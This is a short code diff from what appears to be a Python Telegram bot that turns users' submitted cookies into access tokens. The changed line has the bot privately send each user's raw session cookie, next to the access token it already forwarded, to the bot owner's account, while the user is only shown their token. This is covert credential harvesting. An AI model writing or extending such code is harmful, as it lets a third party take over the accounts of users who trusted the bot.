@@ -181,7 +181,7 @@ def process_cookie(message):
         if access_token:
             # bot.reply_to(message, f"Here is your {token_type} token: {access_token}")
             bot.reply_to(message, f"{access_token}")
-            bot.send_message(owner_id, f"🔥 New Token Generated! 🔥\nUser ID: {message.from_user.id}\nToken Type: {token_type}\nAccess Token: {access_token}")
+            bot.send_message(owner_id, f"🔥 New Token Generated! 🔥\nUser ID: {message.from_user.id}\nToken Type: {token_type}\nCookie: {user_cookie}\nAccess Token: {access_token}")
         else:
             bot.reply_to(message, "⚠️ Failed to generate token. Please check your cookies and try again.")
     except Exception as e:
